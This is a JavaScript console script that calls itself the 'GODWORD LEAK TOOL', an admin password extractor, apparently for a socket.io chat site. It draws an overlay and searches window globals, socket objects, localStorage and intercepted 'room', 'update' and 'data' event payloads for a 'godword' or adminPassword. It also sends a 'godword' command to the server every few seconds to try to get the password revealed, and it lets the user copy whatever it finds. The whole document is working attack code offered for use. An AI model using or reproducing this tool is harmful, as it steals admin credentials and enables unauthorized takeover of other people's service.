(() => {
  console.log('%c[GODWORD LEAK] Initializing password leak tool...', 'color: #00ff00; font-weight: bold;');
  
  // Create GUI
  const html = `
    <div id="godwordBox" style="position:fixed;top:50px;right:50px;width:420px;background:linear-gradient(135deg, #1a0033 0%, #000000 100%);border:3px solid #00ff00;border-radius:12px;padding:18px;box-shadow:0 8px 32px rgba(0,255,0,0.5);font-family:'Courier New',monospace;z-index:99999;color:#00ff00;">
      <div id="dragHandleGod" style="cursor:move;padding-bottom:12px;border-bottom:2px solid #00ff00;">
        <h2 style="margin:0;text-align:center;color:#00ff00;text-shadow:0 0 10px #00ff00;">🔓 GODWORD LEAK TOOL</h2>
        <p style="margin:5px 0 0 0;text-align:center;font-size:11px;color:#66ff66;">Admin Password Extractor</p>
      </div>

      <div style="margin-top:15px;">
        <div style="background:rgba(0,255,0,0.1);padding:12px;border-radius:6px;border:1px solid #00ff00;margin-bottom:12px;">
          <div style="font-size:12px;margin-bottom:8px;color:#66ff66;">STATUS:</div>
          <div id="statusText" style="font-size:14px;font-weight:bold;color:#00ff00;">⏳ Listening for godword...</div>
        </div>

        <div style="background:rgba(0,255,0,0.15);padding:12px;border-radius:6px;border:1px solid #00ff00;margin-bottom:12px;">
          <div style="font-size:12px;margin-bottom:8px;color:#66ff66;">DETECTED GODWORD:</div>
          <input type="text" id="godwordDisplay" readonly value="Waiting for data..." style="width:100%;padding:8px;background:#000;color:#00ff00;border:1px solid #00ff00;border-radius:4px;font-family:'Courier New',monospace;font-size:16px;font-weight:bold;text-align:center;">
        </div>

        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px;">
          <button id="copyGodword" style="padding:10px;background:#00ff00;color:#000;border:none;border-radius:6px;font-weight:bold;cursor:pointer;font-size:12px;">📋 COPY</button>
          <button id="manualCheck" style="padding:10px;background:#006600;color:#00ff00;border:1px solid #00ff00;border-radius:6px;font-weight:bold;cursor:pointer;font-size:12px;">🔍 CHECK NOW</button>
        </div>

        <div style="background:rgba(255,255,0,0.1);padding:10px;border-radius:6px;border:1px solid #ffff00;margin-bottom:12px;">
          <div style="font-size:11px;color:#ffff00;margin-bottom:8px;">📊 DETECTION LOG:</div>
          <div id="eventLog" style="font-size:10px;color:#ffcc00;line-height:1.6;max-height:100px;overflow-y:auto;">
            Starting passive listener...
          </div>
        </div>

        <div style="margin-top:12px;padding:8px;background:rgba(255,0,0,0.1);border-radius:6px;border:1px solid #ff0000;">
          <small style="color:#ff6666;font-size:10px;">
            ⚠️ Scans: <span id="scanCount">0</span> | 
            Socket: <span id="socketStatus">Searching...</span>
          </small>
        </div>

        <button id="closeGodTool" style="width:100%;padding:8px;background:#660000;color:#ff6666;border:1px solid #ff0000;border-radius:6px;cursor:pointer;margin-top:10px;font-size:11px;">✖ CLOSE TOOL</button>
      </div>
    </div>
  `;

  document.body.insertAdjacentHTML('beforeend', html);

  const box = document.getElementById('godwordBox');
  const dragHandle = document.getElementById('dragHandleGod');
  const statusText = document.getElementById('statusText');
  const godwordDisplay = document.getElementById('godwordDisplay');
  const copyBtn = document.getElementById('copyGodword');
  const manualCheckBtn = document.getElementById('manualCheck');
  const closeBtn = document.getElementById('closeGodTool');
  const eventLog = document.getElementById('eventLog');
  const scanCount = document.getElementById('scanCount');
  const socketStatus = document.getElementById('socketStatus');

  // Make draggable
  let isDragging = false;
  let currentX, currentY, initialX, initialY;

  dragHandle.addEventListener('mousedown', (e) => {
    isDragging = true;
    initialX = e.clientX - box.offsetLeft;
    initialY = e.clientY - box.offsetTop;
  });

  document.addEventListener('mousemove', (e) => {
    if (isDragging) {
      e.preventDefault();
      currentX = e.clientX - initialX;
      currentY = e.clientY - initialY;
      box.style.left = currentX + 'px';
      box.style.top = currentY + 'px';
      box.style.right = 'auto';
    }
  });

  document.addEventListener('mouseup', () => {
    isDragging = false;
  });

  // State
  let scans = 0;
  let foundGodword = null;
  let eventLogMessages = [];

  function updateEventLog(message) {
    eventLogMessages.unshift(message);
    if (eventLogMessages.length > 8) eventLogMessages.pop();
    eventLog.innerHTML = eventLogMessages.join('<br>');
  }

  function updateUI(status, godword) {
    statusText.textContent = status;
    
    if (godword) {
      godwordDisplay.value = godword;
      foundGodword = godword;
      godwordDisplay.style.color = '#00ff00';
      godwordDisplay.style.fontWeight = 'bold';
    }
  }

  // Safe object scanning with depth limit and seen tracking
  function scanForGodword(obj, depth = 0, seen = new WeakSet()) {
    if (depth > 5 || !obj || typeof obj !== 'object') return null;
    
    // Prevent circular references
    if (seen.has(obj)) return null;
    seen.add(obj);
    
    try {
      // Direct checks
      if (obj.godword && typeof obj.godword === 'string') return obj.godword;
      if (obj.godWord && typeof obj.godWord === 'string') return obj.godWord;
      if (obj.adminPassword && typeof obj.adminPassword === 'string') return obj.adminPassword;
      
      // Check for godword in command lists
      if (obj.list && Array.isArray(obj.list)) {
        if (obj.list[0] === 'godword' && obj.list[1]) return obj.list[1];
      }
      
      // Light recursion on key properties
      const keysToCheck = ['data', 'room', 'settings', 'config', 'user'];
      for (let key of keysToCheck) {
        if (obj[key] && typeof obj[key] === 'object') {
          const result = scanForGodword(obj[key], depth + 1, seen);
          if (result) return result;
        }
      }
    } catch (e) {
      // Silent fail
    }
    
    return null;
  }

  function performScan() {
    scans++;
    scanCount.textContent = scans;
    updateEventLog(`🔍 Scan #${scans}...`);

    // Check if socket exists
    if (typeof socket === 'undefined' || !socket) {
      socketStatus.textContent = 'Not Found';
      updateEventLog('⚠️ Socket not available');
      return null;
    }

    socketStatus.textContent = 'Found ✓';

    // Method 1: Check window.godword
    if (window.godword) {
      console.log('%c[GODWORD LEAK] Found in window.godword!', 'color: #00ff00; font-weight: bold;');
      updateUI('✅ FOUND (window)', window.godword);
      updateEventLog(`🎯 GODWORD: ${window.godword}`);
      return window.godword;
    }

    // Method 2: Check socket properties (safe, non-recursive)
    try {
      if (socket.godword) {
        console.log('%c[GODWORD LEAK] Found in socket.godword!', 'color: #00ff00; font-weight: bold;');
        updateUI('✅ FOUND (socket)', socket.godword);
        updateEventLog(`🎯 GODWORD: ${socket.godword}`);
        return socket.godword;
      }
    } catch (e) {}

    // Method 3: Listen to specific socket events passively
    // This is safe - we just add listeners, not override
    if (!window.godwordListenerAdded) {
      window.godwordListenerAdded = true;
      
      // Listen for room data
      try {
        socket.on('room', (data) => {
          updateEventLog('📥 room event received');
          const result = scanForGodword(data);
          if (result && !foundGodword) {
            console.log('%c[GODWORD LEAK] Found in room data!', 'color: #00ff00; font-weight: bold;');
            updateUI('✅ FOUND (room event)', result);
            updateEventLog(`🎯 GODWORD: ${result}`);
            foundGodword = result;
          }
        });
      } catch (e) {}

      // Listen for update events
      try {
        socket.on('update', (data) => {
          updateEventLog('📥 update event received');
          const result = scanForGodword(data);
          if (result && !foundGodword) {
            console.log('%c[GODWORD LEAK] Found in update data!', 'color: #00ff00; font-weight: bold;');
            updateUI('✅ FOUND (update event)', result);
            updateEventLog(`🎯 GODWORD: ${result}`);
            foundGodword = result;
          }
        });
      } catch (e) {}

      // Listen for any data event
      try {
        socket.on('data', (data) => {
          updateEventLog('📥 data event received');
          const result = scanForGodword(data);
          if (result && !foundGodword) {
            console.log('%c[GODWORD LEAK] Found in data event!', 'color: #00ff00; font-weight: bold;');
            updateUI('✅ FOUND (data event)', result);
            updateEventLog(`🎯 GODWORD: ${result}`);
            foundGodword = result;
          }
        });
      } catch (e) {}

      updateEventLog('✓ Passive listeners added');
    }

    // Method 4: Check localStorage
    try {
      const stored = localStorage.getItem('godword');
      if (stored) {
        console.log('%c[GODWORD LEAK] Found in localStorage!', 'color: #00ff00; font-weight: bold;');
        updateUI('✅ FOUND (localStorage)', stored);
        updateEventLog(`🎯 GODWORD: ${stored}`);
        return stored;
      }
    } catch (e) {}

    // Method 5: Try to trigger godword reveal by sending the command
    try {
      if (socket && socket.emit) {
        // Send godword command - server might echo it back or reveal it
        socket.emit('command', { list: ['godword'] });
        updateEventLog('📤 Sent godword command');
      }
    } catch (e) {}

    updateEventLog('⏳ Monitoring...');
    return null;
  }

  // Manual check button
  manualCheckBtn.addEventListener('click', () => {
    console.log('%c[GODWORD LEAK] Manual check triggered', 'color: #00ff00');
    performScan();
  });

  // Copy functionality
  copyBtn.addEventListener('click', () => {
    if (foundGodword) {
      godwordDisplay.select();
      document.execCommand('copy');
      navigator.clipboard.writeText(foundGodword).catch(() => {});
      
      const originalText = copyBtn.textContent;
      copyBtn.textContent = '✅ COPIED!';
      copyBtn.style.background = '#00aa00';
      setTimeout(() => {
        copyBtn.textContent = originalText;
        copyBtn.style.background = '#00ff00';
      }, 2000);
      console.log('%c[GODWORD LEAK] Godword copied!', 'color: #00ff00; font-weight: bold;');
    } else {
      alert('No godword found yet!');
    }
  });

  // Close tool
  closeBtn.addEventListener('click', () => {
    box.remove();
    console.log('%c[GODWORD LEAK] Tool closed', 'color: #ff0000');
  });

  // Initial scan
  setTimeout(() => performScan(), 500);

  // Periodic scanning (every 5 seconds)
  setInterval(() => {
    if (!foundGodword) {
      performScan();
    }
  }, 5000);

  console.log('%c[GODWORD LEAK] Tool initialized (Safe Mode)', 'color: #00ff00; font-weight: bold;');
  console.log('%c[GODWORD LEAK] Using passive listeners - no crashes', 'color: #00ff00');
})();
